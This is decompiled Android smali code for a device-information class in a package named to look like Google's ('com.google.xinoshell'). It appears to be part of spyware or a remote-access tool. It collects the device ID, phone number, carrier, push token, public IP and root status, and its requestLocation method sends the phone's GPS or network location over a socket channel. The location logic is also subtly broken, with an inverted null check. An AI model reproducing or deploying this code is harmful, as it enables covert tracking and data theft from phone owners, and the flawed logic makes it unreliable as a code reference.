.class public Lcom/google/xinoshell/utils/DeviceInfoUtil;
.super Ljava/lang/Object;
.source "DeviceInfoUtil.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/xinoshell/utils/DeviceInfoUtil$FetchPublicIPTask;,
        Lcom/google/xinoshell/utils/DeviceInfoUtil$PublicIPListener;,
        Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;
    }
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "DeviceInfoUtil"

.field private static context:Landroid/content/Context;

.field private static prefs:Lcom/google/xinoshell/utils/SharedPrefManager;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 29
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 30
    sput-object p1, Lcom/google/xinoshell/utils/DeviceInfoUtil;->context:Landroid/content/Context;

    .line 31
    new-instance v0, Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-direct {v0, p1}, Lcom/google/xinoshell/utils/SharedPrefManager;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/google/xinoshell/utils/DeviceInfoUtil;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    .line 32
    return-void
.end method

.method private formatSize(J)Ljava/lang/String;
    .locals 5
    .param p1, "size"    # J

    .line 109
    const/4 v0, 0x0

    .line 110
    .local v0, "suffix":Ljava/lang/String;
    long-to-float v1, p1

    .line 111
    .local v1, "fSize":F
    const-wide/16 v2, 0x400

    cmp-long v2, p1, v2

    if-ltz v2, :cond_1

    .line 112
    const-string v0, "KB"

    .line 113
    const/high16 v2, 0x44800000    # 1024.0f

    div-float/2addr v1, v2

    .line 114
    cmpl-float v3, v1, v2

    if-ltz v3, :cond_0

    .line 115
    const-string v0, "MB"

    .line 116
    div-float/2addr v1, v2

    .line 118
    :cond_0
    cmpl-float v3, v1, v2

    if-ltz v3, :cond_1

    .line 119
    const-string v0, "GB"

    .line 120
    div-float/2addr v1, v2

    .line 123
    :cond_1
    new-instance v2, Ljava/lang/StringBuilder;

    float-to-long v3, v1

    invoke-static {v3, v4}, Ljava/lang/Long;->toString(J)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 124
    .local v2, "resultBuffer":Ljava/lang/StringBuilder;
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->length()I

    move-result v3

    add-int/lit8 v3, v3, -0x3

    .line 125
    .local v3, "commaOffset":I
    :goto_0
    if-lez v3, :cond_2

    .line 126
    const/16 v4, 0x2c

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->insert(IC)Ljava/lang/StringBuilder;

    .line 127
    add-int/lit8 v3, v3, -0x3

    goto :goto_0

    .line 129
    :cond_2
    if-eqz v0, :cond_3

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 130
    :cond_3
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    return-object v4
.end method

.method public static getAndroidVersion()Ljava/lang/String;
    .locals 1

    .line 39
    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    return-object v0
.end method

.method public static getDeviceID(Landroid/content/Context;)Ljava/lang/String;
    .locals 4
    .param p0, "context"    # Landroid/content/Context;

    .line 44
    sget-object v0, Lcom/google/xinoshell/utils/DeviceInfoUtil;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v1, "device_id"

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 45
    .local v0, "deviceID":Ljava/lang/String;
    if-eqz v0, :cond_0

    .line 46
    return-object v0

    .line 49
    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v3, "android_id"

    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 51
    if-eqz v0, :cond_1

    .line 52
    sget-object v2, Lcom/google/xinoshell/utils/DeviceInfoUtil;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v2, v1, v0}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 54
    :cond_1
    const-string v0, "Unknown"

    .line 57
    :goto_0
    return-object v0
.end method

.method public static getFCM_Token(Landroid/content/Context;Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;)V
    .locals 3
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "callback"    # Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;

    .line 187
    new-instance v0, Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/utils/SharedPrefManager;-><init>(Landroid/content/Context;)V

    sput-object v0, Lcom/google/xinoshell/utils/DeviceInfoUtil;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    .line 188
    sget-object v0, Lcom/google/xinoshell/utils/DeviceInfoUtil;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v1, "fcm_token"

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 190
    .local v0, "storedToken":Ljava/lang/String;
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_0

    .line 210
    :cond_0
    invoke-interface {p1, v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;->onTokenReceived(Ljava/lang/String;)V

    goto :goto_1

    .line 191
    :cond_1
    :goto_0
    invoke-static {}, Lcom/google/firebase/messaging/FirebaseMessaging;->getInstance()Lcom/google/firebase/messaging/FirebaseMessaging;

    move-result-object v1

    invoke-virtual {v1}, Lcom/google/firebase/messaging/FirebaseMessaging;->getToken()Lcom/google/android/gms/tasks/Task;

    move-result-object v1

    new-instance v2, Lcom/google/xinoshell/utils/DeviceInfoUtil$$ExternalSyntheticLambda0;

    invoke-direct {v2, p1}, Lcom/google/xinoshell/utils/DeviceInfoUtil$$ExternalSyntheticLambda0;-><init>(Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;)V

    .line 192
    invoke-virtual {v1, v2}, Lcom/google/android/gms/tasks/Task;->addOnCompleteListener(Lcom/google/android/gms/tasks/OnCompleteListener;)Lcom/google/android/gms/tasks/Task;

    .line 212
    :goto_1
    return-void
.end method

.method public static getModel()Ljava/lang/String;
    .locals 1

    .line 35
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    return-object v0
.end method

.method public static getSelfNumber(Landroid/content/Context;)Ljava/lang/String;
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .line 173
    const-string v0, "phone"

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 174
    .local v0, "telephonyManager":Landroid/telephony/TelephonyManager;
    const-string v1, "android.permission.READ_PHONE_STATE"

    invoke-virtual {p0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_0

    .line 175
    const-string v1, "android.permission.READ_PHONE_NUMBERS"

    invoke-virtual {p0, v1}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v1

    if-eqz v1, :cond_0

    .line 176
    const-string v1, "permission denied"

    return-object v1

    .line 178
    :cond_0
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method static synthetic lambda$getFCM_Token$0(Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;Lcom/google/android/gms/tasks/Task;)V
    .locals 4
    .param p0, "callback"    # Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;
    .param p1, "task"    # Lcom/google/android/gms/tasks/Task;

    .line 193
    invoke-virtual {p1}, Lcom/google/android/gms/tasks/Task;->isSuccessful()Z

    move-result v0

    const-string v1, "Firebase"

    if-nez v0, :cond_0

    .line 194
    invoke-virtual {p1}, Lcom/google/android/gms/tasks/Task;->getException()Ljava/lang/Exception;

    move-result-object v0

    .line 195
    .local v0, "e":Ljava/lang/Exception;
    const-string v2, "Fetching FCM token failed"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 196
    invoke-interface {p0, v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;->onError(Ljava/lang/Exception;)V

    .line 197
    return-void

    .line 200
    .end local v0    # "e":Ljava/lang/Exception;
    :cond_0
    invoke-virtual {p1}, Lcom/google/android/gms/tasks/Task;->getResult()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    .line 201
    .local v0, "token":Ljava/lang/String;
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_1

    .line 202
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "New FCM token: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 203
    sget-object v1, Lcom/google/xinoshell/utils/DeviceInfoUtil;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v2, "fcm_token"

    invoke-virtual {v1, v2, v0}, Lcom/google/xinoshell/utils/SharedPrefManager;->set(Ljava/lang/String;Ljava/lang/String;)V

    .line 204
    invoke-interface {p0, v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;->onTokenReceived(Ljava/lang/String;)V

    goto :goto_0

    .line 206
    :cond_1
    new-instance v1, Ljava/lang/Exception;

    const-string v2, "Empty token received"

    invoke-direct {v1, v2}, Ljava/lang/Exception;-><init>(Ljava/lang/String;)V

    invoke-interface {p0, v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;->onError(Ljava/lang/Exception;)V

    .line 208
    :goto_0
    return-void
.end method


# virtual methods
.method public getCPUArchitecture()Ljava/lang/String;
    .locals 2

    .line 89
    sget-object v0, Landroid/os/Build;->SUPPORTED_ABIS:[Ljava/lang/String;

    const/4 v1, 0x0

    aget-object v0, v0, v1

    return-object v0
.end method

.method public getPublicIP(Lcom/google/xinoshell/utils/DeviceInfoUtil$PublicIPListener;)V
    .locals 2
    .param p1, "listener"    # Lcom/google/xinoshell/utils/DeviceInfoUtil$PublicIPListener;

    .line 105
    new-instance v0, Lcom/google/xinoshell/utils/DeviceInfoUtil$FetchPublicIPTask;

    invoke-direct {v0, p1}, Lcom/google/xinoshell/utils/DeviceInfoUtil$FetchPublicIPTask;-><init>(Lcom/google/xinoshell/utils/DeviceInfoUtil$PublicIPListener;)V

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil$FetchPublicIPTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 106
    return-void
.end method

.method public getSDKVersion()I
    .locals 1

    .line 85
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    return v0
.end method

.method public getServiceProvider()Ljava/lang/String;
    .locals 3

    .line 94
    :try_start_0
    sget-object v0, Lcom/google/xinoshell/utils/DeviceInfoUtil;->context:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    .line 95
    .local v0, "telephonyManager":Landroid/telephony/TelephonyManager;
    if-eqz v0, :cond_0

    .line 96
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_0

    return-object v1

    .line 100
    .end local v0    # "telephonyManager":Landroid/telephony/TelephonyManager;
    :cond_0
    goto :goto_0

    .line 98
    :catch_0
    move-exception v0

    .line 99
    .local v0, "e":Ljava/lang/SecurityException;
    const-string v1, "DeviceInfoUtil"

    const-string v2, "Permission READ_PHONE_STATE is required"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 101
    .end local v0    # "e":Ljava/lang/SecurityException;
    :goto_0
    const-string v0, "Unknown"

    return-object v0
.end method

.method public getStorageMemory()Ljava/lang/String;
    .locals 3

    .line 76
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-static {}, Landroid/os/Environment;->getDataDirectory()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->getTotalSpace()J

    move-result-wide v0

    .line 77
    .local v0, "totalMemory":J
    invoke-direct {p0, v0, v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->formatSize(J)Ljava/lang/String;

    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v2

    .line 78
    .end local v0    # "totalMemory":J
    :catch_0
    move-exception v0

    .line 79
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "DeviceInfoUtil"

    const-string v2, "Error getting storage memory"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 80
    const-string v1, "Unknown"

    return-object v1
.end method

.method public isRooted()Z
    .locals 7

    .line 61
    const/16 v0, 0x9

    new-array v0, v0, [Ljava/lang/String;

    const-string v1, "/system/app/Superuser.apk"

    const/4 v2, 0x0

    aput-object v1, v0, v2

    const-string v1, "/sbin/su"

    const/4 v3, 0x1

    aput-object v1, v0, v3

    const/4 v1, 0x2

    const-string v4, "/system/bin/su"

    aput-object v4, v0, v1

    const/4 v1, 0x3

    const-string v4, "/system/xbin/su"

    aput-object v4, v0, v1

    const/4 v1, 0x4

    const-string v4, "/data/local/xbin/su"

    aput-object v4, v0, v1

    const/4 v1, 0x5

    const-string v4, "/data/local/bin/su"

    aput-object v4, v0, v1

    const/4 v1, 0x6

    const-string v4, "/system/sd/xbin/su"

    aput-object v4, v0, v1

    const/4 v1, 0x7

    const-string v4, "/system/bin/failsafe/su"

    aput-object v4, v0, v1

    const/16 v1, 0x8

    const-string v4, "/data/local/su"

    aput-object v4, v0, v1

    .line 62
    .local v0, "paths":[Ljava/lang/String;
    array-length v1, v0

    move v4, v2

    :goto_0
    if-ge v4, v1, :cond_1

    aget-object v5, v0, v4

    .line 63
    .local v5, "path":Ljava/lang/String;
    new-instance v6, Ljava/io/File;

    invoke-direct {v6, v5}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v6

    if-eqz v6, :cond_0

    .line 64
    return v3

    .line 62
    .end local v5    # "path":Ljava/lang/String;
    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 67
    :cond_1
    return v2
.end method

.method public isSDCardAvailable()Z
    .locals 2

    .line 71
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v0

    const-string v1, "mounted"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    return v0
.end method

.method public requestLocation(Ljava/lang/String;Lcom/google/xinoshell/connection/ManageSocket;)V
    .locals 13
    .param p1, "socketId"    # Ljava/lang/String;
    .param p2, "manageSocket"    # Lcom/google/xinoshell/connection/ManageSocket;

    .line 220
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 221
    .local v0, "out":Lorg/json/JSONObject;
    const-string v1, "socketId"

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 222
    sget-object v1, Lcom/google/xinoshell/utils/DeviceInfoUtil;->context:Landroid/content/Context;

    const-string v2, "location"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/location/LocationManager;

    .line 223
    .local v1, "lm":Landroid/location/LocationManager;
    const/4 v2, 0x0

    .line 225
    .local v2, "loc":Landroid/location/Location;
    const-string v3, "gps"

    invoke-virtual {v1, v3}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v3

    .line 226
    .local v3, "gpsLoc":Landroid/location/Location;
    const-string v4, "network"

    invoke-virtual {v1, v4}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v4

    .line 227
    .local v4, "netLoc":Landroid/location/Location;
    if-eqz v3, :cond_loc_check

    if-eqz v4, :cond_loc_check

    move-object v2, v3

    goto :goto_0

    .line 229
    :cond_loc_check
    if-eqz v3, :cond_0

    move-object v2, v3

    goto :goto_0

    .line 230
    :cond_0
    if-eqz v4, :cond_1

    move-object v2, v4

    .line 232
    :cond_1
    :goto_0
    if-eqz v2, :cond_2

    .line 233
    const-string v5, "error"

    const-string v6, "No location available"

    invoke-virtual {v0, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 234
    const-string v5, "location-data"

    invoke-virtual {p2, v5, v0}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 235
    return-void

    .line 238
    :cond_2
    const-string v5, "lat"

    invoke-virtual {v2}, Landroid/location/Location;->getLatitude()D

    move-result-wide v6

    invoke-virtual {v0, v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 239
    const-string v5, "lng"

    invoke-virtual {v2}, Landroid/location/Location;->getLongitude()D

    move-result-wide v6

    invoke-virtual {v0, v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 240
    const-string v5, "accuracy"

    invoke-virtual {v2}, Landroid/location/Location;->getAccuracy()F

    move-result v6

    float-to-double v6, v6

    invoke-virtual {v0, v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 241
    const-string v5, "provider"

    invoke-virtual {v2}, Landroid/location/Location;->getProvider()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 242
    const-string v5, "timestamp"

    invoke-virtual {v2}, Landroid/location/Location;->getTime()J

    move-result-wide v6

    invoke-virtual {v0, v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 243
    const-string v5, "location-data"

    invoke-virtual {p2, v5, v0}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 245
    nop

    goto :goto_end

    .line 247
    :catch_0
    move-exception v0

    .line 248
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "DeviceInfoUtil"

    const-string v2, "requestLocation error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 249
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 250
    .local v1, "errObj":Lorg/json/JSONObject;
    const-string v2, "socketId"

    invoke-virtual {v1, v2, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 251
    const-string v2, "error"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 252
    const-string v2, "location-data"

    invoke-virtual {p2, v2, v1}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V

    .line 254
    .end local v0    # "e":Ljava/lang/Exception;
    .end local v1    # "errObj":Lorg/json/JSONObject;
    :goto_end
    return-void
.end method
